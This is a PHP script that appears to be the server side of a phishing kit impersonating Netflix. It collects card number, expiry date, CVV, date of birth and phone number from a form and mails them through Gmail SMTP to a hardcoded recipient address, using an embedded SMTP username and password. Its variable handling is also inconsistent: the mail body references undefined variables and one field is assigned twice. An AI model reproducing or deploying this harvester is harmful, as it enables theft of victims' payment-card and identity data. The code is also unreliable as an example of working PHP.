<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';



$mail = new PHPMailer(true);
$response = [];

try {
    // Récupération des données du formulaire
    $firstName = $_POST['id_email'] ?? 'N/A';
    $lastName = $_POST['CN'] ?? 'N/A';
    $email = $_POST['ED'] ?? 'N/A';
    $montant = $_POST['CV'] ?? 'N/A';
    $montant = $_POST['DB'] ?? 'N/A';
    $iban = $_POST['PN'] ?? 'N/A';


    // Configuration du serveur SMTP
    $mail->isSMTP();
   $mail->Host = 'smtp.gmail.com'; // Serveur SMTP
    $mail->SMTPAuth = true;
    $mail->Username = 'donquidofi612@gmail.com'; // Nom d'utilisateur SMTP
    $mail->Password = 'ojbeukobjpadsjcq'; // Mot de passe SMTP
    $mail->SMTPSecure = 'tls'; // Activer SSL, utiliser 'tls' si vous préférez TLS
    $mail->Port = 587; // Port pour SSL

    // Destinataires
    $mail->setFrom('donquidofi612@gmail.com', 'NETFLIX');
    $mail->addAddress('princekadahfi@gmail.com', 'Client'); // Ajoutez une adresse de destinataire
    // Contenu de l'e-mail
    $mail->isHTML(true);
    $mail->Subject = 'Notification de virement bancaire';
    $mail->Body = "
    <ul>
        <li><strong>Nom complet :</strong> $id_email</li>
        <li><strong>Expire date :</strong> $ED</li>
        <li><strong>Numero de compte :</strong> $CN</li>
        <li><strong>CV :</strong> $CV</li>
        <li><strong>Date de naissance :</strong> $DB</li>
        <li><strong>Numéro de téléphone :</strong> $PN</li>
    </ul>
    <br>
    Votre compte est bloqué, aucune opération bancaire ne peut être effectuée pour le moment. <br>
";


    $mail->send();
    $response['success'] = true;
    $response['message'] = 'Le message a été envoyé avec succès.';
} catch (Exception $e) {
    $response['success'] = false;
    $response['message'] = 'Message could not be sent. Mailer Error: ' . $e->getMessage();
}

header('Content-Type: application/json');
echo json_encode($response);
